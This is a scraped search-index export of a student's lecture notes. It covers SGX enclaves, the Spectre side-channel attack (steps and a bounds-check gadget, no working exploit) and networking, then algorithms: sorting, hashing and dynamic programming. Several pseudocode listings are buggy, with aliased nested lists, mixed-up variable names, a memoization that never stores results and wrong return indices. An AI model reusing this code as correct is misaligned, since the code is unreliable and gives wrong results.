Almost all take place over the web - difficult to know if you\u0026rsquo;re in the right place as a user SMS-based 2-factor auth does little good; mostly protect against stolen credentials Partial panacea: U2F and physical security keys\nBrowser malware cannot steal user credentials U2F should not enable tracking across sites "},{"id":101,"href":"/notes/cs155/2022-05-04-processor-security/","title":"Processor Security","section":"CS 155, Spring 2022","content":" Processor security # The processor # Part of the trusted computing base (TCB) But is optimized for performance Security may be secondary Processor design and security: Important security features Hardware enclaves Memory encryption (TME) RDRAND etc. Some features can be exploited for attacks Speculative execution Transactional memory Intel Software Guard eXstensions (SGX) # Extension to Intel processors that support Enclaves: running code and memory isolated from rest of system Attestation: prove to local/remote system what code is running in enclave Minimum TCB: only processor is trusted and nothing else DRAM and peripherals are untrusted Writes to memory are encrypted Applications Storing a web server HTTPS secret key: secret key only opened inside an enclave Malware cannot get the key Note: this is different from TPM2 - TPM2 only provides secure storage at boot, after that it\u0026rsquo;s all in memory Running a private job in the cloud: job runs in enclave Cloud admin cannot get code or data or job Client side: hide antivirus signatures AV signatures are only opened inside an enclave Data science on federated data Compute on shared data, without ever having to share the data with anyone else SGX now deprecated in consumer CPUs, only available in server CPUs SGX enclaves # Application defines part of itself as an enclave Untrusted part of memory creates enclave Enclave is isolated memory in process memory space Inaccessible while processor is not in SGX mode Untrusted part can call a trusted function in the enclave To do execution, processor goes into SGX mode Creating en enclave: ECREATE: establish mem addr for enclave EADD: copy memory pages into enclave EEXTEND: compute hash of enclave contents, 256 bytes at a time EINIT: verifies that hashed content is properly signed; if so, initializes enclave (signature: RSA3072) EENTER: call function inside enclave EEXIT: return from enclave SGX attestation # Problem: enclave memory is in the clear prior to activation (EINIT) How to get secrets into enclave? SGX insecurity # Side channels: attacker controls the OS, OS sees lots of side-channel info Memory access patterns State of processor caches as enclave executes State of branch predictor Extract quoting key Attestation: proves to 3rd party what code is running in enclave Quoting sk stored in Intel enclave on untrusted machines What if attacker extracts sk from some quoting enclave? Can attest to arbitrary non-enclave code The Spectre attack # Background # CPU optimizations Clock speed maxed out: Pentium 4 (2004) reached 3.8 GHz Memory latency is slow and not improving much To gain CPU performance, need to do more per cycle Reduce memory delays: caches Work during delays: speculative execution Memory caches Hold local (fast) copy of recently-addressed 64-byte chunks of memory Speculative execution At a branch: CPU will guess that the code will go in one direction and start executing that code while waiting for branch result When result comes back, if it is wrong direction, throw away the work and start executing that direction Mitigations to the below attacks are still an active area of research Other speculative execution attacks also exist (e.g. Meltdown) Conditional branch (Variant 1) attack # e.g.\nif (x \u0026lt; array1_size) y = array2[array1[x] * 4096]; Suppose memory at array1 base is 8 bytes of data that doesn\u0026rsquo;t matter Memory at array1 base + 1000: something secret Suppose unsigned int x comes from untrusted caller Execution without speculation is safe: array2[array1[x]*4096] is not evaluated unless x \u0026lt; array1_size Before attack: Train branch predictor to expect if() is true: e.g. call with x \u0026lt; array1_size Evict array1_size and array2[] from cache Attacker calls victim with x = 1000 Speculative exec while waiting for array1_size: Predict that if() is true Read address (array1 base + x) Using out-of-bounds x=1000 Read returns secret byte (in cache - fast) Brings array2[BYTE * 4096] brought into the cache CPU realizes if() is false, discards speculative work But leaves BYTE in the cache Attacker (another process or core): for i = 0...255: measure read time for array2[i * 4096] When i = BYTE read is fast (cached), this reveals the secret BYTE Mitigation: speculation stopping instruction (e.g. LFENCE) Idea: insert LFENCE on all vulnerable code paths Need to do so in a non-manual way that does not compromise performance Insertion by smart compiler: supported in LLVM Requires compiler to be aware of specific CPU designs Indirect branch (Variant 2) attack # Indirect branches: can go anywhere, e.g. jmp [rax] If destination is delayed, CPU guesses and proceeds speculatively Find an indirect jmp with an attacker controlled register Then cause mispredict to a useful gadget Attack steps: Mistrain branch prediction so spec-ex will go to gadget Evict address [rax] from cache to cause spec-ex Execute victim so it spec-runs gadget Detect change in cache state to determine memory data "},{"id":102,"href":"/notes/cs155/2022-05-09-internet-protocol-security/","title":"Internet Protocol Security","section":"CS 155, Spring 2022","content":" Internet Protocol Security # The Internet # Global protocol that provides best-effort delivery of packet between connected hosts Packet: structured sequence of bytes Header: metadata used by network Payload: user data to be transported Every host has a unique identifier - IP address Series of routers receive packets, look at header destination address, and send it one hop towards destination IP address Network protocols # Define how hosts communicate in published network protocols Syntax: how communication is structured (e.g. format and order of messages) Semantics: what communication means. Actions taken on transmit or receipt of message, or when timer expiers. What assumptions can be made. Protocol layering # Networks use stack of protocol layers Each layer has different responsibility Layers define abstraction boundaries Lower layers provide services to layers above Don\u0026rsquo;t care what higher layers do Higher layers use services of layers below Don\u0026rsquo;t worry about how it works OSI 5 layer model # Physical\nHow do bits get translated into electrical, optical, or radio signals. Link (typically: ethernet)\nHow to get packet to the next hop. Transmission of data frames between two nodes connected by a physical link. Assumes: local nodes are physically connected Task: transfer bytes between two hosts on physically connected network MAC address: 6-byte address given to physical hosts, assigned at manufacture time Frame contains: Destination MAC Source MAC Data type (usually \u0026ldquo;IP\u0026rdquo;) Data CRC checksum Originally: transmission was broadcast, every local computer got every packet Now: switched ethernet Switch learns at which physical port each MAC address lives based on MAC source addresses If switch knows MAC address M is at port P, it will only send a packet for M to port P If not, sends packet everywhere Network\nRepsonsible for packet forwarding. How to get a packet to the final destination when there are many hops along the way. Assumes: frames can be sent on a local network Task: let any two computers exchange packets IPv4 header: Instruct routers and hosts what to do with a packet All values are filled in by the sending host ARP: Address Resolution Protocol How do we map IP addr -\u0026gt; MAC addr? How do routes learn where IPs are located? Transport\nAllows a client to establish a connection to specific services (e.g. web server on port 80): provides reliable communication Application\nDefines how individual applications communicate. For example, HTTP defines how browsers send requests to web servers. Interaction of layers:\nPacket encapsulation # Protocol N1 can use the services of lower layer protocol N2 A packet P1 of N1 is encapsulated into a packet P2 of N2 The payload of P2 is P1 The control information of P2 is derived from that of P1 "},{"id":103,"href":"/notes/cs161/2022-01-03-intro/","title":"Intro","section":"CS 161, Winter 2022","content":" CS 161 Design and Analysis of Algorithms # About the course # Course goals # The design and analysis of algorithms These go hand in hand In this course Learn to think analytically about algorithms Flesh out an \u0026ldquo;algorithmic toolkit\u0026rdquo; Learn to communicate clearly about algorithms Guiding questions # Does it work? Is it fast? Can I do better? Should it work? Should it be fast? Logistics # Lectures\nMon/Wed 9:45 - 11:15 First two weeks: On Zoom (link on Canvas) Later: In person (NVIDIA auditorium) Resources\nSlides Videos Notes IPython Notebooks Concept check questions Homework\nWeekly, assigned Wednesdays at 12:30 pm and due the next Wednesday at 11:59 pm Two parts: exercises and problems Do exercises individually Try the problems individually before discussing them Can exchange ideas with classmates, but must write up solutions individually Cite all collaborators as well as sources used Exams\nMidterm: Feb 7-8 (48 hr window) Final: Wed Mar 16, 3:30pm-6:30pm Grading:\nWeighting: HW (50%), Midterm (20%), Final (30%) Lowest of 8 homework scores dropped Interaction with course staff\nEd discussion forum Office hours (on Nooks) Sections (on Zoom) Thursdays and Fridays Optional but recommended Why algorithms? # Algorithms are fundamental # Applications:\nOperating systems (CS140) Machine learning (CS229) Cryptography (CS255) Compilers (CS143) Networking (CS144) Computational biology (CS262) Algorithms are useful # As inputs get bigger and bigger, have good algorithms becomes more and more important Integer multiplication # Problem: take two n-digit numbers and multiply them Grade-school multiplication: takes roughly n2 one-digit operations Scales the same whether by hand or implemented in code Wizard\u0026rsquo;s algorithm: O(n1.6) Divide and Conquer # Ex. 1234 x 5678 = (12x100 + 34)(56x100 + 78) = (12x56)10000 + (34x56 + 12x78)100 + (34x78) = \u0026hellip; Algorithm Multiply(x, y)\nif n == 1: return xy Write x = a(10n/2 + b) Write y = c(10n/2 + d) Recursively compute ac, ad, bc, bd ac = Multiply(a, c) etc\u0026hellip; Add them up to get xy: xy = ac(10n) + (ad + bc)(10n/2) + bd Runtime: at each recursion step, we break a 2n-digit problem into 4 n-digit problems. This results in O(n2) performance.\nKaratsuba multiplication # Recursively compute: ac bd (a+b)(c+d) = ac + bd + bc + ad Subtract off ac and bd from (a+b)(c+d) we get (ad + bc) and can get the product Runtime: 3log2 n ~= n1.6 "},{"id":104,"href":"/notes/cs161/2022-01-05-worst-case-and-asymptotic-analysis/","title":"Worst Case and Asymptotic Analysis","section":"CS 161, Winter 2022","content":" Worst-case and asymptotic analysis # Worst-case analysis # An algorithm must be correct on all possible inputs The running time of the algorithm is the worst possible running time over all inputs That is, if we design a purposefully adversarial input, the algorithm should still work on that input Pro and con: very strong guarantee Asymptotic analysis: Big-O notation # Meaningful way to talk about the runtime of an algorithm, independent of programming language or computing platform, without having to count all of the operations Focuses on how the runtime scales with input size n Highest-degree term in the sum is the only one that counts e.g.\n(n2/10) + 100 -\u0026gt; O(n2)\n0.063n2 - 0.5n + 12.7 -\u0026gt; O(n2)\n100n1.5 - 1010000sqrt(n) -\u0026gt; O(n1.5)\n11 n log(n) + 1 -\u0026gt; O(n log(n))\nPros:\nAbstracts away hardware- and language- specific issues Makes algorithm analysis more tractable Allows us to meaningfully compare how algorithms will perform on large inputs Cons:\nOnly makes sense if n is large compared to the constant factors Definition for O(\u0026hellip;) # Let T(n), g(n) be functions of positive integers Consider T(n) as a runtime: positive and increasing in n We say \u0026ldquo;T(n) is O(g(n))\u0026rdquo; if for large enough n, T(n) is at most some constant multiple of g(n) Formally, T(n) = O(g(n)) if there exists a c, n0 \u0026gt; 0 such that for each n \u0026gt; n0, T(n) \u0026lt;= c g(n) Definition for Ω(\u0026hellip;) # We say \u0026ldquo;T(n) is Ω(g(n))\u0026rdquo; if for large enough n, T(n) is at least as big as a constant multiple of g(n) Formally, T(n) = Ω(g(n)) if there exists a c, n0 \u0026gt; 0 such that for each n \u0026gt; n0, T(n) \u0026gt;= c g(n) Definition for Θ(\u0026hellip;) # We say \u0026ldquo;T(n) is Θ(g(n))\u0026rdquo; iff both T(n) = O(g(n)) T(n) = Ω(g(n)) Proofs # To prove T(n) = O(g(n)), need to come up with c and n0 such that the definition is satisfied To prove T(n) is not O(g(n)), use proof by contradiction: Come up with c and n0 such that the definition is satisfied Examples # Sorting # Basics # Idea: take array of unsorted items (i.e., [6, 4, 3, 8, 1, 5, 2, 7]) and sort it in nondecreasing order (i.e., [1, 2, 3, 4, 5, 6, 7, 8]) For convenience, assume all items are distinct and length of list is n Insertion Sort # At each iteration i starting with i=1: Move A[i] towards the beginning of the list until we can\u0026rsquo;t find anything smaller or can\u0026rsquo;t go further Worst-case analysis on Insertion Sort # Claim: Insertion Sort is correct.\nProof: Induction.\nBase case: empty array (A[:1]) is sorted. Inductive hypothesis: At the i\u0026rsquo;th iteration of the outer loop, A[:i+1] is sorted, for 0 \u0026lt;= i \u0026lt; k Inductive step: Consider the k\u0026rsquo;th iteration. Insertion sort will move A[k] to its appropriate position (i.e., it will move it to a position p where A[p-1] \u0026lt; A[p] \u0026lt; A[p+1]). Thus A[:k+1] is sorted at the end of the k\u0026rsquo;th iteration, as required. Thus insertion sort is correct for 0 \u0026lt;= k \u0026lt; n. Asymptotic analysis # O(n2) Merge sort # Algorithm MergeSort(A): if len(A) \u0026lt;= 1, return A L = MergeSort(A[:len(A)/2]) R = MergeSort(A[len(A)/2:]) return Merge(L, R) Worst-case analysis on Merge Sort # Claim: Merge Sort is correct\nProof: Induction.\nBase case (i=1): One-element array is always sorted. Inductive hypothesis: In every recursive call on an array of length at most i, MergeSort returns a sorted array Inductive step: Assume inductive hypothesis holds for k \u0026lt; i. Then it holds for k=i because if left and right halves are sorted, then Merge(L, R) is sorted. Therefore, this works and in the top recursive call, MergeSort returns a sorted array. Asymptotic analysis on MergeSort # Runs in O(n log(n)) Why? At each step, we divide A into L and R arrays, where |L| = |R| = |A|/2 There are log(n) of these divisions = log(n) recursive calls Each Merge(L, R) takes O(n) time to finish. Thus, O(n log(n)) "},{"id":105,"href":"/notes/cs161/2022-01-10-recurrence-relations/","title":"Recurrence Relations","section":"CS 161, Winter 2022","content":" Recurrence relations # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":106,"href":"/notes/cs161/2022-01-12-median-and-selection/","title":"Median and Selection","section":"CS 161, Winter 2022","content":" The k-SELECT problem # Let A be an array of integers and let k be an integer Goal: Return the k\u0026rsquo;th smallest element of A e.g. A = [7, 4, 3, 8, 1, 5, 9, 14] SELECT(A, 1) = 1 SELECT(A, 2) = 3 SELECT(A, 3) = 4 SELECT(A, 8) = 14 SELECT(A, 1) = MIN(A) SELECT(A, n/2) = MEDIAN(A) O(n log n) algorithm # Very simple! Sort the array, return A[k-1] What we want: an O(n) algorithm # Ex. MIN(A) = SELECT(A, 1)\nret = MAX_INT for i in 0..n-1: ret = min(ret, A[i]) return ret Divide and conquer # Algorithm SELECT(A, k)\nFirst, pick a \u0026ldquo;pivot\u0026rdquo; Next, partition the array into \u0026ldquo;bigger than pivot\u0026rdquo; (L) and \u0026ldquo;less than pivot\u0026rdquo; (R) if k = len(L) + 1: return A[pivot] if k \u0026lt; len(L) + 1: return SELECT(L, k) if k \u0026gt; len(L) + 1: return SELECT(R, k - len(L) - 1) Running time # T(n) = T(len(L)) + O(n) if len(L) \u0026gt; k-1 T(len(R)) + O(n) if len(L) \u0026lt; k-1 O(n) if len(L) = k-1 Ideal pivot would split the input in half; however, finding such a pivot is itself an application of SELECT Yields O(n) algorithm \u0026ldquo;Good enough\u0026rdquo; pivot approximates median: median of medians of groups of size 5, which takes O(n) time to find Alternatively, random pivot performs fine on average "},{"id":107,"href":"/notes/cs161/2022-01-19-randomized-algorithms-and-quicksort/","title":"Randomized Algorithms and Quicksort","section":"CS 161, Winter 2022","content":" Randomized Algorithms # Idea: make random choices during the algorithm\nHope the algorithm works Hope the algorithm is fast Today: look at algorithms that always work and are probably fast\ne.g. select with random pivot Analysis of randomized algorithms # Scenario 1: publish algorithm, adversarially picked input, run algorithm (expected running time - as a random variable)\nScenario 2: publish algorithm, adversarially picked input and randomness (worst-case analysis)\nBogosort # Algorithm BogoSort(A):\nWhile true: Randomly permute A (O(n) via Knuth shuffle) Check if A is sorted If A is sorted, return A Analysis:\nLet xi be 1 if A is sorted after iteration i and 0 otherwise E[xi] = 1/n! (n! permutations, and only one of them is sorted) E[number of iterations until A is sorted] = n! Expected running time of Bogosort: E[running time on a list of length n] = E[number of iterations * time per iteration] = (time per iteration)E[number of iterations] = O(n * n!) Worst case runtime: infinite! Quicksort # Algorithm QuickSort(A):\nIf len(A) \u0026lt;= 1: return Pick some x = A[i] at random; let x be the pivot Partition the rest of A into L (less than x) R (greater than x) Rearrange A into with [L, x, R] QuickSort(L) QuickSort(R) Analysis:\nT(n) = T(|L|) + T(|R|) + O(n) Ideally, if the pivot splits the array exactly in half: T(n) = 2T(n/2) + O(n) T(n) = O(n log n) What happens in average/worst case? Theorem: the expected running time of quicksort is O(n log n)\nProof: count the number of comparisons made by the algorithm (see lecture slides)\n"},{"id":108,"href":"/notes/cs161/2022-01-24-sorting-lower-bounds/","title":"Sorting Lower Bounds","section":"CS 161, Winter 2022","content":" Sorting lower bounds # Defining a valid sorting algorithm # Comparison-based model of computation (requires Ω(n log n) steps):\nInput: array Output: sorted array Operations allowed: comparisons Another model:\nCountingSort and RadixSort Run in time O(n) Ω(n log n) bound for comparison sorting # Theorem:\nAny deterministic comparison-based sorting algorithm must take Ω(n log n) steps Any randomized comparison-based sorting algorithm must take Ω(n log n) steps in expectation Argument:\nAll comparison-based sorting algorithms give rise to a decision tree Internal nodes correspond to yes/no (\u0026gt;= / \u0026lt;) decisions Leaf nodes correspond to outputs (in this case, all possible orderings of the items) Running an algorithm on a particular input corresponds to a particular path through the tree In all such trees, the longest path is at least log(n!) ~= log((n/e)n) = n ((log n) - 1) = O(n log n) Thus traversing a path on the decision tree is worst case O(n log n) MergeSort is optimal! O(n) sorting* # CountingSort # Suppose we have an array of numbers (e.g. [9, 6, 3, 5, 2, 1, 2]) Set up buckets for values 1..9 Foreach number in the array, put the number in its respective buckets Concatenate the buckets Assumptions:\nNeed to be able to know what bucket to put something in Need to evaluate items directly, not just by comparison Need to know what values might show up ahead of time Need to assume there are not too many such values RadixSort # For sorting integers up to size M, or more generally for lexicographically sorting strings Can use less space than CountingSort Idea: CountingSort on least significant digit, then next significant, etc Treat each bucket as FIFO, then concatenate Running time: O((logrM + 1)(n+r)) Choose n = r: O(n(lognM + 1)) If M \u0026lt;= nc for some constant c, then this is O(n) If M \u0026gt;= nc for some constant c, then this is O(n2/log n) "},{"id":109,"href":"/notes/cs161/2022-01-26-binary-search-trees/","title":"Binary Search Trees","section":"CS 161, Winter 2022","content":" Binary search trees # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":110,"href":"/notes/cs161/2022-01-31-hashing/","title":"Hashing","section":"CS 161, Winter 2022","content":" Hashing # Generic data structure that allows fast insert/delete/search Doesn\u0026rsquo;t need items to be comparable, only hashable Idea: get better performance in expectation using randomness Primitive: direct addressing # Suppose all keys are in the set {1..9} Create buckets 1..9 Insert: map key i to bucket i Delete: remove from bucket i Search: look for bucket i Problem: if keys are arbitrary, this requires a lot of memory\nAn improvement: put items in buckets based on one digit\nProblem with this: if keys have same common digit, one bucket becomes very large Hash functions improve bucket allocation by using randomness.\nTerminology # U: universe of size M (very very large) n: number of (distinct) elements of U we expect to see, where (n \u0026laquo; M) Hash functions # A hash function h: U -\u0026gt; {1..n} is a function that maps elements of U to buckets 1..n Example: h(x) = least significant digit of x For simplicity, we assume the number of buckets is n, although this doesn\u0026rsquo;t need to be the case In general, want #buckets = O(#elements we expect to see) Hash tables # Array of n buckets, where each bucket stores a linked list Can insert into a linked list in time O(1) Search/deletion in a linked list takes time O(length(list)) Bucket index: given by hash function for any element Goals: Not too many buckets (at most n) to not use too much space Items should be spread out across buckets for fast insert/delete/search Designing a hash function # Goal: Design a function h: U -\u0026gt; {1..n} where no matter what n items of U are adversarially chosen, buckets are balanced (i.e., O(1) entries per bucket)\nThis requires a random hash function!\nIf the function were deterministic, an adversary could pick inputs that are guaranteed to result in one bucket being overloaded Testing parameters:\nAdversary chooses n items u1\u0026hellip;un and any sequence of insert/search/delete operations on those items Algorithm chooses random hash function h: U -\u0026gt; {1..n} Hash table should provide O(1) search/insert/delete performance Refined goal: For all adversarial inputs u1..un, and for all i in {1..n}, want E[length(list containing ui)] \u0026lt;= 2\nExample: random hash function # Suppose h: U -\u0026gt; {1..n} is a uniformly random function (h(1) is uniformly random between 1 and n); write down the generated permutation h(i) for all i in U Pro: Adversary has a very hard time trying to defeat this; fulfills expectation in refined goal Con: Needs a lot of storage space to store the permutation Hash families # Cleverly chosen subset H of functions; only need log(|H|) bits to store an element of H e.g. H = {LeastSignificantDigit, MostSignificantDigit} and pick a random function in H for each element; use one bit to denote what we used Universal hash families: hash family that satisfies P{h in H} {h(ui) = h(uj)} \u0026lt;= 1/n for all nonequal ui, uj in U\nExample:\nPick prime p \u0026gt;=M fa,b(x) = ax + b (mod p) ha,b(x) = fa,b(x) (mod n) H = {ha,b | a, b in {1..p-1}} Using this structure: hash table takes O(n log M) bits of space\nO(n) buckets O(n) items requiring O(log M) bits each O(log M) bits for the hash function "},{"id":111,"href":"/notes/cs161/2022-02-02-graphs-and-graph-search/","title":"Graphs and Graph Search","section":"CS 161, Winter 2022","content":" Graphs and graph search (BFS and DFS) # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":112,"href":"/notes/cs161/2022-02-07-strongly-connected-components/","title":"Strongly Connected Components","section":"CS 161, Winter 2022","content":" Strongly connected components # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":113,"href":"/notes/cs161/2022-02-09-weighted-graphs-and-dijkstra/","title":"Weighted Graphs and Dijkstra","section":"CS 161, Winter 2022","content":" Weighted graphs and Dijkstra\u0026rsquo;s algorithm # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":114,"href":"/notes/cs161/2022-02-14-dynamic-programming/","title":"Dynamic Programming","section":"CS 161, Winter 2022","content":" Dynamic Programming # Definitions # Dynamic programming: algorithmic design paradigm Usually for solving optimization problems (i.e., shortest path) Also useful for combinatorial problems (i.e., how many ways are there to achieve some task?) Elements of dynamic programming # Optimal sub-structure (necessary for DP to be correct) Big problems break up into subproblems e.g. Fibonacci (below): F(i) for i \u0026lt;= n e.g. Bellman-Ford (below): shortest paths with at most i edges for i \u0026lt;= n The solution to a problem can be expressed in terms of solutions to smaller subproblems e.g. Fibonacci: F(i+1) = F(i) + F(i-1) e.g. Bellman-Ford: d[v] = min(d[v], minu d[u] + w(u, v)) Overlapping sub-problems (necessary for DP to achieve speedup) e.g. Fibonacci: Both F[i+2] and F[i+1] directly use F[i]; many F[i+x] indirectly use F[i] e.g. Bellman-Ford: many different entries of d at step i+1 will use d[v] at step i; lots of entries of d at step i+x will indirectly do so Example: Fibonacci numbers # Recursive algorithm (i.e., Week 1): # def fibonacci(n): if n == 0: return 0 if n == 1: return 1 return fibonacci(n-1) + fibonacci(n-2) Runtime: exponential. Note: this does a lot of repeated computation! For fibonacci(8) we calculate fibonacci(2) 11 times (and fibonacci(1) and fibonacci(0) even more!) Instead: memoize the previous fibonacci calls # Memoization: keeping track of previous function calls, usually in an array or other data structure\ndef fasterFibonacci(n): F = [None] * (n+1) F[0] = 0 F[1] = 1 for i in range(2, n+1): F[i] = F[i-1] + F[i-2] return F[n] Bottom-up DP # Like what we see for Fibonacci and Bellman-Ford Solve smaller problems first (F[0] or d at step [0], then F[1] or d at step 1, then\u0026hellip;) then bigger problems, then the full problem (F(n) or d at step n-1) Preferable if we know recursion might get extremely deep (i.e., lots of variables to recurse over in algorithm/subproblem state) - that way, we don\u0026rsquo;t overwhelm the function call stack Top-down DP # Adding memoization to previous divide-and-conquer methods To solve big problems: Recurse to solve smaller probelms Then recurse to solve even smaller problems etc\u0026hellip; Keep track of what small problems you\u0026rsquo;ve already solved to prevent re-solving the same problem twice Preferable if we know that the recursion doesn\u0026rsquo;t need to compute certain subproblems Top-down example # F = [None] * (n+1) F[0] = 0 F[1] = 1 def Fibonacci(n): if F[n] != None: return F[n] return Fibonacci(n-1) + Fibonacci(n-2) Example: Bellman-Ford algorithm # Motivation: Dijkstra drawbacks # Needs non-negative edge weights If the weights change, need to re-run the whole algorithm Difference between Bellman-Ford and Dijkstra: # Bellman-Ford is slower than Dijkstra Bellman-Ford can handle negative edge weights Can detect negative cycles (i.e., path from a-\u0026gt;b-\u0026gt;c-\u0026gt;a has less cost than zero) Can be useful if we want to say some edges are actively helpful to take, rather than costly Can be useful as a building block in other algorithms Allows some flexibility if weights change Bellman-Ford intuition: Instead of picking the node u with the smallest d[u], update all the node weights at once\nPseudocode # def bellmanFord(V, E, s): d = [INT_MAX] * len(V) d[s] = 0 for i in range(len(V) - 1): for (u, v, w) in E: # u src, v dst, w weight d[v] = min(d[v], d[u] + w) return d Correctness # Inductive hypothesis: At each step i, d[v] is equal to the cost of the shortest path between s and v of length at most i edges\nBase case: 0; vacuously true (0 edges -\u0026gt; infinite cost)\nInductive step: Suppose IH applies for 0 \u0026lt;= n \u0026lt;= k; then at step k for all v, d[v] is the shortest path between s and v with at most k edges. Suppose we do a k+1 iteration, then we can choose to take any u as an additional intermediate between s and v or not; thus the path will be the same or shorter than before and have at most k+1 edges.\nConclusion: At step |V|-1, for each v, d[v] is equal to the cost of the shortest path between s and v of length at most |V|-1 edges (which is the absolute shortest path).\nRuntime # One loop for edges (|E|) inside a loop for vertices (|V|) -\u0026gt; O(|V||E|)\nFloyd-Warshall Algorithm # Algorithm for All-Pairs Shortest Paths\nNeed to know shortest path from u to v for all pairs (u, v) of vertices in the graph (not just from a special single source s) Brute force: run Dijkstra from all nodes s: this takes time O(|V||E| log|V|) If negative edge weights: need Bellman-Ford, this takes time O(|V|2|E|) Floyd-Warshall intuition: for each node k, check if the distance between each pair of nodes i and j can be reduced by using k as an intermediate Just like Bellman-Ford: idea is to calculate shortest path between i and j for each (i, j) with at most h edges at each step h Runtime: O(|V|3) Better than running Bellman-Ford n times However: if no negative edge weights and the graph is not extremely dense, better to run Dijkstra with a min-heap Space complexity: O(|V|2) Psuedocode # dist = [[INF] * len(V)] * len(V) for i in range(len(V)): d[i][i] = 0 for k in range(len(V)): for i in range(len(V)): for j in range(len(V)): d[i][j] = min(d[i][j], d[i][k] + d[k][j]) "},{"id":115,"href":"/notes/cs161/2022-02-16-dynamic-programming-applications/","title":"Dynamic Programming Applications","section":"CS 161, Winter 2022","content":" Applications of Dynamic Programming # Longest Common Subsequence # Definition # Subsequence: chosen sequential subset of a sequence e.g.: BDFH is a subsequence of ABCDEFGH If X, Y are sequences, a common sequence that is a subsequence of both e.g. BDFH is a subsequence of ABCDEFGH and of ABDFGHI Longest common subsequence (LCS) is a common subsequence that is the longest e.g. ABDFGH is the LCS of of ABCDEFGH and of ABDFGHI Dynamic programming steps # Optimal substructure Subproblems will be finding LCS\u0026rsquo;s of prefixes to X and Y Let C[i, j] = length_of_LCS(X[i], Y[j]) Case 1: X[i] = Y[j] Then C[i, j] = 1 + C[i-1,j-1] (because we can continue the previous subsequences by adding the new common character) Case 2: X[i] != Y[j] Then C[i, j] = max(C[i-1, j], C[i, j-1]) (try possibilities for prefix considering previous considered characters) Recursive formulation of the optimal solution Case 0: i = 0 || j = 0 -\u0026gt; C[i, j] = 0 Case 1: X[i] = Y[j] \u0026amp;\u0026amp; i,j \u0026gt; 0 -\u0026gt; C[i, j] = C[i-1, j-1] + 1 Case 2: X[i] != Y[j] \u0026amp;\u0026amp; i,j \u0026gt; 0 -\u0026gt; C[i, j] = max(C[i-1, j] + C[i, j-1]) Bottom-up dynamic programming formulaton def lcs(X, Y): C = [ [0] * len(X) ] * len(Y) for i in range(1, len(X)): for j in range(1, len(Y)): if X[i] = Y[j]: C[i][j] = C[i-1][j-1] + 1 else: C[i][j] = max(C[i-1, j], C[i, j-1]) return C[len(X)-1][len(Y)-1] Notes:\nCan cut down on space complexity from O(mn) to O(n) by only keeping two rows However, if we want to recover the actual LCS (instead of its length) we need all rows Knapsack Problem # Definition # Have a number of items, each with some weight and some value Have a knapsack with maximum weight capacity Goal: find maximum value (sum) that can be fit into the knapsack given maximum weight constraint Unbounded knapsack: have infinite copies of all items 0/1 knapsack: can only use an item once Notation: w[i], v[i] weight and value for item i, W knapsack capacity Dynamic programming steps (unbounded) # Optimal substructure Subproblem: unbounded knapsack with a smaller knapsack K[x]: value that can be fit into a knapsack of capacity x Suppose we have optimal solution for capacity x that contains at least one copy of item i Then the optimal solution to x - w[i] removes that item i, since if there was a different optimal solution, we could do better for x Recursive relationship Let K[x] be the optimal value for capacity x Then K[x] = maxi(K[x-w[i]] + v[i]) (K[x] = 0 if there are no i such that w[i] \u0026lt; x) Bottom-up dynamic programming formulation def unboundedKnapsack(W, w, v): K = [0] * (W+1) for x in range(1, W+1): for i in range(len(w)): if w[i] \u0026lt; x: K[x] = max(K[x], K[x-w[i]] + v[i]) return K[w] Notes:\nRuntime: O(nW), whereas input size is n log W -\u0026gt; this is not a polynomial time algorithm, however there is not known to be anything faster Space complexity O(W) Can add item accounting to return the actual items that go in the knapsack (O(nW) space) Dynamic programming steps (0/1) # Optimal substructure Subproblem: 0/1 knapsack using up to the first j items and with smaller knapsack of capacity x K[x, j]: optimal solution for a knapsack of capacity x using only the first j items Case 1: Optimal solution for j items does not use item j Then optimal solution for j items is the same as for j-1 items K[x, j] = K[x, j-1] Case 2: Optimal solution for j items uses item j K[x, j] = K[x-w[j], j-1] Recursive relationship Let K[x, j] be the optimal value for capacity x with j items Then K[x, j] = max(K[x, j-1], K[x-w[j], j-1] + v[j]) Bottom-up dynamic programming formulation def zeroOneKnapsack(W, w, v): K = [ [0] * (W+1) ] * len(w) for x in range(1, len(W)+1): for j in range(1, len(w)): K[x][j] = K[x][j-1] if w[j] \u0026lt;= x: K[x][j] = max(K[x][j], K[x-w[j]][j-1] + v[j]) return K[W][len(w)-1] "},{"id":116,"href":"/notes/cs161/2022-02-23-greedy-algorithms/","title":"Greedy Algorithms","section":"CS 161, Winter 2022","content":" Greedy Algorithms # Idea:\nMake choices one-at-a-time Never look back Hope for the best However: does not work everywhere.\nWhen to use greedy algorithms? # Problem should exhibit optimal substructure:\nOptimal solutions to a problem are made up from optimal solutions of subproblems Each problem depends on only one subproblem Common strategy for proving correctness # Make a series of choices Suppose we\u0026rsquo;re on track to make optimal solution T* Show that at each step, choices won\u0026rsquo;t rule out a globally optimal solution Suppose that T* disagrees with the next greedy choice Manipulate T* in order to make a solution T that\u0026rsquo;s not worse but agrees with the next greedy choice Swap choice k instead of choice j After having made all choices, we haven\u0026rsquo;t ruled out an optimal solution, so the solution we found is optimal This can be turned into an inductive proof.\nWrong greedy: unbounded knapsack # Idea: select items with best value/weight ratio\nThis works if you can fill the entire knapsack capacity However, if there is space left over, then we have a suboptimal solution Correct greedy: activity selection # Problem statement # Input:\nActivities a1\u0026hellip;an Start times s1\u0026hellip;sn Finish times f1\u0026hellip;fn Output:\nMaximize the number of activities to do in a given day Greedy algorithm # Pick activity you can add with the smallest finish time Repeat What makes it greedy?\nAt each step in the algorithm, make a choice: Can increase activity set by one Leaving room for future choices Do this and hope for the best Hope that at the end of the day, this is a globally optimal solution Correctness # When we make a choice, we don\u0026rsquo;t rule out an optimal solution (i.e., there exists some optimal solution that contains that choice) Suppose we have already chosen ai and there is still an optimal T* that extends our choices Now consider the next choice ak If ak in T*, we are done If ak not in T*: Let aj be the activity in T* with smallest finish time after ai Consider schedule T swapping aj for ak T is still allowed, since ak has smaller ending time than aj, so does not conflict with anything T still optimal, since it has the same numer of activities as T* The above is the inductive step of the proof of correctness. "},{"id":117,"href":"/notes/cs161/2022-02-28-minimum-spanning-trees/","title":"Minimum Spanning Trees","section":"CS 161, Winter 2022","content":" Minimum spanning trees # Previous Next \u0026nbsp; \u0026nbsp; Page: / 